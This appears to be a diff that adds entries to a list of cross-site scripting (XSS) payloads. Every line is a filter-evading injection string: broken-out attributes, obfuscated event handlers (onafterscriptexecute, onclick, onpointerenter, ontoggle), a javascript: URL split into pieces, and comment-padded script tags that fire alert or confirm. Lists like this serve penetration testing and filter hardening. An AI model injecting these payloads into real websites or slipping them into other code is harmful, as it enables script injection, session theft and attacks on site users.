@@ -11,3 +11,9 @@ tarun"><x/onafterscriptexecute=confirm%26lpar;)//
 <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
 
 <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
+
+">'><details/open/ontoggle=confirm('XSS')>
+
+'';!--"<XSS>=&{()}
+
+<!--><script>alert/**/()/**/</script>
